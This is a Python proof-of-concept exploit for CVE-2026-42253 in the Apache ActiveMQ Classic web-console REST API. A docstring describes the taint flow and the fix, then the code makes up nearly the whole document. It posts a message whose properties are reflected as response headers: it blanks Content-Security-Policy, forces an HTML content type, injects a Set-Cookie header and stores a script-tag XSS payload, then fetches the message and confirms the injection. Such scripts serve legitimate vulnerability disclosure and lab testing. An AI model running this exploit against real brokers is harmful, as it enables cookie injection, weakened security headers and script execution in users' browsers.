#!/usr/bin/env python3
"""
CVE-2026-42253 - Apache ActiveMQ Classic HTTP response-header injection / XSS via
                 MessageServlet (web console REST API).

Taint flow:
  POST /api/message/<dest>  -> MessageServletSupport.appendParametersToMessage:
       every non-reserved request parameter -> message.setObjectProperty(name, value)
       (attacker controls property NAME and VALUE)
  GET  /api/message/<dest>  -> MessageServlet.setResponseHeaders:
       for each JMS property: response.setHeader(name, value.toString())   [no sanitization]

Impact: attacker sets arbitrary response header name+value -> override security
headers (CSP/X-Frame-Options/Content-Type), inject Set-Cookie, reflected XSS.

Fix (5.19.7/6.2.6): MessageServlet @Deprecated + disabled by default. The
setResponseHeaders sink code is UNCHANGED.

Authorized lab use only.
"""
import argparse, base64, urllib.request, urllib.parse, urllib.error, sys

def req(method, url, user, pw, data=None, headers=None):
    r = urllib.request.Request(url, data=data, method=method)
    r.add_header("Authorization", "Basic " + base64.b64encode(f"{user}:{pw}".encode()).decode())
    for k, v in (headers or {}).items():
        r.add_header(k, v)
    try:
        with urllib.request.urlopen(r, timeout=15) as resp:
            return resp.status, dict(resp.getheaders()), resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers.items()), e.read().decode(errors="replace")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://localhost:8161")
    ap.add_argument("--user", default="admin")
    ap.add_argument("--pass", dest="pw", default="admin")
    ap.add_argument("--queue", default="poison42253")
    args = ap.parse_args()
    base = f"{args.target}/api/message/{args.queue}?type=queue"

    # Malicious JMS properties -> become response headers on consume.
    # 1) inject a brand-new attacker header  2) overwrite a security header (CSP)
    #    3) set Content-Type to text/html to weaponize stored XSS in the body
    props = {
        "X-Injected-By-Attacker": "cve-2026-42253",
        "Content-Security-Policy": "",                      # nuke CSP
        "Content-Type": "text/html",                        # force HTML rendering -> XSS
        "Set-Cookie": "session_hijack=1; Path=/",           # cookie injection
    }
    body_xss = "<script>alert(document.domain)//CVE-2026-42253</script>"

    qs = urllib.parse.urlencode({**props, "body": body_xss})
    post_url = f"{args.target}/api/message/{args.queue}?type=queue&{qs}"

    print("[*] CVE-2026-42253 MessageServlet header injection / XSS")
    print(f"[*] target : {args.target}")
    print(f"[*] queue  : {args.queue}")
    print("[*] STEP 1: POST a message carrying attacker-controlled JMS properties")
    s, h, b = req("POST", post_url, args.user, args.pw, data=b"")
    print(f"    POST -> HTTP {s}")

    print("[*] STEP 2: GET (consume) the message -> properties reflected as response headers")
    s, h, b = req("GET", base, args.user, args.pw)
    print(f"    GET  -> HTTP {s}")
    print("    ---- response headers ----")
    injected = []
    for k, v in h.items():
        flag = ""
        if k in props or k.lower() in (p.lower() for p in props):
            flag = "  <== ATTACKER-CONTROLLED"
            injected.append(k)
        print(f"      {k}: {v}{flag}")
    print("    ---- response body ----")
    print("      " + b.strip().replace("\n", "\n      "))

    print()
    ok = any(k.lower() == "x-injected-by-attacker" for k in h) and \
         h.get("Content-Type", "").lower().startswith("text/html")
    if ok:
        print("[+] CONFIRMED: attacker injected a new header AND overrode Content-Type to text/html")
        print("[+] Body returned as HTML -> stored XSS; security headers attacker-controllable.")
        sys.exit(0)
    else:
        print(f"[~] Injected headers observed: {injected}")
        print("[~] Review headers above for attacker-controlled values.")

if __name__ == "__main__":
    main()
